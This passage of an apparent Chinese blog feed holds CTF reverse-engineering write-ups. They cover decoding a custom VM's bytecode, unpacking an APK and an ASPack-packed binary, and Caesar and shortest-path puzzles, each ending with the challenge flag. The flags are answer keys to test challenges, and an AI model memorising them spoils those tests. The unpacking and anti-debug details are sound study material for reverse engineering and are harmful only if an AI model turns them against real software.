class="number">0xE9</span>, <span class="number">0xB3</span>, <span class="number">0x85</span>, <span class="number">0x99</span>, <span class="number">0x87</span>, <span class="number">0xBF</span>, <span class="number">0xE9</span>, <span class="number">0xB1</span>, <span class="number">0x89</span>, <span class="number">0xE9</span>, <span class="number">0x91</span>, <span class="number">0x89</span>, <span class="number">0x89</span>, <span class="number">0x8F</span>, <span class="number">0xAD</span>]</span><br></pre></td></tr></table></figure><p>在之前进行了myoperate这个函数，应该是encode<br>然后就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">myoperate</span><span class="params">(<span class="type">char</span> *flag, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 i; <span class="comment">// x20</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">15</span>]; <span class="comment">// [xsp+8h] [xbp-98h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">15</span>]; <span class="comment">// [xsp+18h] [xbp-88h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">15</span>]; <span class="comment">// [xsp+28h] [xbp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> code[<span class="number">16</span>]; <span class="comment">// [xsp+38h] [xbp-68h] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [xsp+48h] [xbp-58h]</span></span><br><span class="line"></span><br><span class="line">  LODWORD(i) = len;</span><br><span class="line">  v8 = <span class="number">0x100000CFEEDFA</span>LL;</span><br><span class="line">  dword_100008003 = <span class="number">0xBEEDBEEF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0</span>, (<span class="type">caddr_t</span>)<span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    i = (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)code = <span class="number">0x20D01011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;code[<span class="number">7</span>] = <span class="number">0x300010201180702</span>LL;</span><br><span class="line">      code[<span class="number">2</span>] = *flag;</span><br><span class="line">      interpretBytecode(code, <span class="number">15</span>);</span><br><span class="line">      *(_QWORD *)v6 = <span class="number">0x20D02011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;v6[<span class="number">7</span>] = <span class="number">0x400010201180602</span>LL;</span><br><span class="line">      v6[<span class="number">2</span>] = vm.body[<span class="number">0</span>];</span><br><span class="line">      interpretBytecode(v6, <span class="number">15</span>);</span><br><span class="line">      *(_QWORD *)v5 = <span class="number">0x20D03011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;v5[<span class="number">7</span>] = <span class="number">0x500010201180502</span>LL;</span><br><span class="line">      v5[<span class="number">2</span>] = vm.body[<span class="number">0</span>];</span><br><span class="line">      interpretBytecode(v5, <span class="number">15</span>);</span><br><span class="line">      *(_QWORD *)v4 = <span class="number">0x20D04011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)&amp;v4[<span class="number">7</span>] = <span class="number">0x600010201180402</span>LL;</span><br><span class="line">      v4[<span class="number">2</span>] = vm.body[<span class="number">0</span>];</span><br><span class="line">      interpretBytecode(v4, <span class="number">15</span>);</span><br><span class="line">      *flag++ = ((<span class="type">unsigned</span> __int8)vm.body[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * vm.body[<span class="number">0</span>]);</span><br><span class="line">      --i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( i );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是opcode生成的位置，注意一共有15位同时第二位被换成了flag的值<br>相当于每轮对一个字符加密<br>所以写解密函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">t = [[<span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0xd</span>,<span class="number">0x2</span>,<span class="number">0x7</span>,<span class="number">0x18</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x3</span>],</span><br><span class="line">     [<span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0xd</span>,<span class="number">0x2</span>,<span class="number">0x6</span>,<span class="number">0x18</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x4</span>],</span><br><span class="line">     [<span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x3</span>,<span class="number">0xd</span>,<span class="number">0x2</span>,<span class="number">0x5</span>,<span class="number">0x18</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x5</span>],</span><br><span class="line">    [ <span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0xff</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x4</span>,<span class="number">0xd</span>,<span class="number">0x2</span>,<span class="number">0x4</span>,<span class="number">0x18</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x6</span>]]</span><br><span class="line"><span class="comment"># 0xff用作标志,表明这里使用了上一次加密后的这一位flag</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> t:</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">15</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># this_code = b[i]</span></span><br><span class="line">            code0 = b[i]</span><br><span class="line">            code1 = b[i+<span class="number">1</span>]</span><br><span class="line">            code2 = b[i+<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">if</span> code0 == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>], s[<span class="subst">&#123;code2&#125;</span>] = s[<span class="subst">&#123;code2&#125;</span>], s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] ^= s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] += <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] += s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] -= <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] -= s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">6</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] *= <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">7</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] *= s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">8</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] //= <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">9</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] //= s[<span class="subst">&#123;code2&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">10</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] -= s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">11</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] -= s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">12</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = s[<span class="subst">&#123;code1&#125;</span>] &lt;&lt; <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">13</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = s[0] &lt;&lt; <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">14</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">15</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;print(s[<span class="subst">&#123;code1&#125;</span>])&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">16</span>:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;i -= 1&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;print(s[<span class="subst">&#123;i + <span class="number">16</span>&#125;</span>])&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">17</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;i = <span class="subst">&#123;code2&#125;</span> if not s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">18</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;i = <span class="subst">&#123;code2&#125;</span> if s[<span class="subst">&#123;code1&#125;</span>]&quot;</span>)</span><br><span class="line">            <span class="comment"># elif code0 == 19:</span></span><br><span class="line">            <span class="comment">#     # i = code1</span></span><br><span class="line">            <span class="comment"># elif code0 == 20:</span></span><br><span class="line">            <span class="comment">#     # s[code1] = s[code1]</span></span><br><span class="line">            <span class="comment"># elif code0 == 21:</span></span><br><span class="line">            <span class="comment">#     # i -= 1</span></span><br><span class="line">            <span class="comment">#     # s[0] = s[i + 16]</span></span><br><span class="line">            <span class="comment"># elif code0 == 22:</span></span><br><span class="line">            <span class="comment">#     # s[i + 16] = code1</span></span><br><span class="line">            <span class="comment"># elif code0 == 23:</span></span><br><span class="line">            <span class="comment">#     break</span></span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">24</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[0] = byte_100008002 | byte_100008001&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">25</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = s[0] &gt;&gt; <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> code0 == <span class="number">26</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;s[<span class="subst">&#123;code1&#125;</span>] = <span class="subst">&#123;code2&#125;</span>&quot;</span>)</span><br><span class="line">            i += <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="built_in">len</span>(b):</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">0</span>] = flag[i]</span><br><span class="line">s[<span class="number">1</span>] = s[<span class="number">0</span>] &gt;&gt; <span class="number">1</span></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] &lt;&lt; <span class="number">7</span></span><br><span class="line">s[<span class="number">0</span>] = byte_100008002 | byte_100008001</span><br><span class="line">s[<span class="number">0</span>] ^= s[<span class="number">3</span>]</span><br><span class="line"><span class="comment"># s[0] = 255</span></span><br><span class="line">s[<span class="number">1</span>] = s[<span class="number">0</span>] &gt;&gt; <span class="number">2</span></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] &lt;&lt; <span class="number">6</span></span><br><span class="line">s[<span class="number">0</span>] = byte_100008002 | byte_100008001</span><br><span class="line">s[<span class="number">0</span>] ^= s[<span class="number">4</span>]</span><br><span class="line"><span class="comment"># s[0] = 255</span></span><br><span class="line">s[<span class="number">1</span>] = s[<span class="number">0</span>] &gt;&gt; <span class="number">3</span></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] &lt;&lt; <span class="number">5</span></span><br><span class="line">s[<span class="number">0</span>] = byte_100008002 | byte_100008001</span><br><span class="line">s[<span class="number">0</span>] ^= s[<span class="number">5</span>]</span><br><span class="line"><span class="comment"># s[0] = 255</span></span><br><span class="line">s[<span class="number">1</span>] = s[<span class="number">0</span>] &gt;&gt; <span class="number">4</span></span><br><span class="line">s[<span class="number">2</span>] = s[<span class="number">0</span>] &lt;&lt; <span class="number">4</span></span><br><span class="line">s[<span class="number">0</span>] = byte_100008002 | byte_100008001</span><br><span class="line">s[<span class="number">0</span>] ^= s[<span class="number">6</span>]</span><br></pre></td></tr></table></figure><p>但是我不理解的是byte_100008002和byte_100008001的值，不然没法或。。<br>去网上看了wp,看到了它们的dword_100008003和这两个值是一样的<br>（然后才发现那四个值在一起是个数组，前面还有3个寄存器，就是上面代码的s0,s1,s2）<br>就是</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">arr</span> = <span class="number">0</span>xDEEDBEEF.to_bytes(<span class="number">4</span>,<span class="string">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure><p>相当于这个dword是s &#x3D; [0,0,0xEF,0xBE,0xED,0xDE]放在这四个位置上,因为deadbeef是第四个上面放着<br>写一下解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">last = [<span class="number">0xDF</span>, <span class="number">0xD5</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0xDB</span>, <span class="number">0xA1</span>, <span class="number">0xA5</span>, </span><br><span class="line">        <span class="number">0x89</span>, <span class="number">0xBD</span>, <span class="number">0xE9</span>, <span class="number">0x95</span>, <span class="number">0xB3</span>, <span class="number">0x9D</span>, <span class="number">0xE9</span>, <span class="number">0xB3</span>, </span><br><span class="line">        <span class="number">0x85</span>, <span class="number">0x99</span>, <span class="number">0x87</span>, <span class="number">0xBF</span>, <span class="number">0xE9</span>, <span class="number">0xB1</span>, <span class="number">0x89</span>, <span class="number">0xE9</span>, </span><br><span class="line">        <span class="number">0x91</span>, <span class="number">0x89</span>, <span class="number">0x89</span>, <span class="number">0x8F</span>, <span class="number">0xAD</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>(<span class="params">k</span>):</span><br><span class="line">    q = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            t = (s &gt;&gt; <span class="number">1</span> | (s &lt;&lt; <span class="number">7</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xef</span></span><br><span class="line">            t = (t &gt;&gt; <span class="number">2</span> | (t &lt;&lt; <span class="number">6</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xbe</span></span><br><span class="line">            t = (t &gt;&gt; <span class="number">3</span> | (t &lt;&lt; <span class="number">5</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xed</span></span><br><span class="line">            t = (t &gt;&gt; <span class="number">4</span> | (t &lt;&lt; <span class="number">4</span>)&amp;<span class="number">0xff</span>)^<span class="number">0xde</span></span><br><span class="line">            t = (t &gt;&gt; <span class="number">5</span> | (t &lt;&lt; <span class="number">3</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">            <span class="keyword">if</span> (t == k[i]):</span><br><span class="line">                q.append(s)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line">pl(back(last))</span><br></pre></td></tr></table></figure><p>?为什么出不来，好好好，不是deadbeef是beedbeef是吧,,6,改好之后</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">DASCTF</span><span class="template-variable">&#123;you_are_right_so_cool&#125;</span></span><br></pre></td></tr></table></figure><hr><p>做完这几道题，感觉vm主要考把opcode转汇编，再把汇编转可读代码的静态分析能力，这里要分析出reg，stack的实现是哪些代码，如果能拿到opcode，就能分析出其中可能不用的case，省去一些时间</p><p>而且一般是用单字节加密，所以后面可以爆破答案，</p><p>如果用python写脚本，要注意左移时要限定范围不然会得不到正确结果</p><p>最后在第三道题，ida版本能直接影响到反编译的结果，最后用7.5版本才能正确反编译出来</p>]]></content>
    
    
    <summary type="html">上次介绍完之后，再次根据题目来练习</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="逆向" scheme="https://www.pri87.vip/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="VM" scheme="https://www.pri87.vip/tags/VM/"/>
    
  </entry>
  
  <entry>
    <title>polar_re部分wp</title>
    <link href="https://www.pri87.vip/posts/5a6db6c8.html"/>
    <id>https://www.pri87.vip/posts/5a6db6c8.html</id>
    <published>2024-03-05T13:52:24.000Z</published>
    <updated>2024-03-05T13:54:59.086Z</updated>
    
    <content type="html"><![CDATA[<p>这个polar的re感觉质量好低，不是太简单就是太恶心，写了5道不想写了QAQ</p><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>用apktool解包，在assets文件中把zip文件名改成png得到flag</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;money<span class="number">_</span><span class="keyword">is</span><span class="number">_n</span>othing&#125;</span><br></pre></td></tr></table></figure><p>这题被坑了一个晚上，因为一开始尝试静态分析一关一关过，结果解包之后flag在图片里面，之后看到这种可以逆出资源的可以先尝试把资源找出来，说不定就是flag，<del>建议把这道题放到misc</del></p><h3 id="老八小冒险"><a href="#老八小冒险" class="headerlink" title="老八小冒险"></a>老八小冒险</h3><p>这个题挺简单的，甚至都是原始工程文件，没有打包也不用解包</p><p>直接用rpgmaker vx ace打开，直接看事件就好了</p><p>jbkjckjsdsfdsfjbkjckj的md5</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">60</span>b<span class="number">6</span>cd<span class="number">0848639100</span><span class="keyword">c</span><span class="number">68</span><span class="keyword">c</span><span class="number">04</span>d<span class="number">4884</span>db<span class="number">1e8</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="逢七必变"><a href="#逢七必变" class="headerlink" title="逢七必变"></a>逢七必变</h3><p>第一次见到aspack壳，尝试搜索工具脱壳,找到了，那么就直接使用，结果工具有问题，看来还是要一步一步调</p><p>打开之后，里面的代码好像很奇怪，代码看不懂，一开始call然后又返回，不理解，esp定律一开始也不好使&#x2F;</p><p>好吧，因为这个特征不一样，这个aspack壳的特点是一开始popad，然后call，最后popad，然后ret，在popad完对esp下断点然后点击运行，可以直接到ret的位置，之后f7一下，应该可以到一个call加jmp的位置，这里就是oep</p><p><img src="https://s2.loli.net/2024/03/04/6QyLedptHSumvg7.png" alt="image-20240304193949183"></p><p>在这个位置dump，然后打开dump的文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> len; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [esp+14h] [ebp-110h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [esp+20h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v6, <span class="string">&quot;akf`|7fda1005c?1b253bc17346b5c77bab?0z&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6[<span class="number">39</span>], <span class="number">0</span>, <span class="number">0xD9</span>u);</span><br><span class="line">  len = <span class="built_in">strlen</span>(v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">    v6[i] ^= <span class="number">7u</span>;</span><br><span class="line">  sub_5F1040(<span class="string">&quot;You got it!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后有手就行了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">0</span>acf6772d86e524ed60431e2d00efe87&#125;</span><br></pre></td></tr></table></figure><h3 id="高卢战记"><a href="#高卢战记" class="headerlink" title="高卢战记"></a>高卢战记</h3><p>直接ida打开obj文件，看main函数</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">6f759f8f7</span>:deg::<span class="number">796486</span>&lt;<span class="number">8</span>&lt;<span class="number">8</span>edf9:<span class="number">73</span></span><br></pre></td></tr></table></figure><p>只有一个这个然后就输出了这个</p><p>一开始看不懂</p><p>结果。。因为《高卢战记》是凯撒写的，书里面用的3的位移，所以要用-3</p><p>这样接出来就是flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">3</span><span class="keyword">c</span><span class="number">426</span><span class="keyword">c</span><span class="number">5</span><span class="keyword">c</span><span class="number">47</span>abd<span class="number">774631539595</span>bac<span class="number">6740</span>&#125;</span><br></pre></td></tr></table></figure><p>真恶心，为什么不是misc</p><h3 id="最短路"><a href="#最短路" class="headerlink" title="最短路"></a>最短路</h3><p>直接得到最短26</p><p>画图或者ai（比ai还快）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">from</span> <span class="string">prism</span> <span class="string">import</span> <span class="string">*</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">import</span> <span class="string">heapq</span></span><br><span class="line"></span><br><span class="line"><span class="string">def</span> <span class="string">dijkstra(graph,</span> <span class="string">start,</span> <span class="string">end):</span></span><br><span class="line">    <span class="string">heap</span> <span class="string">=</span> [<span class="string">(0</span>, <span class="string">start)</span>]</span><br><span class="line">    <span class="string">distances</span> <span class="string">=</span> &#123;<span class="attr">node:</span> <span class="string">float(&#x27;infinity&#x27;)</span> <span 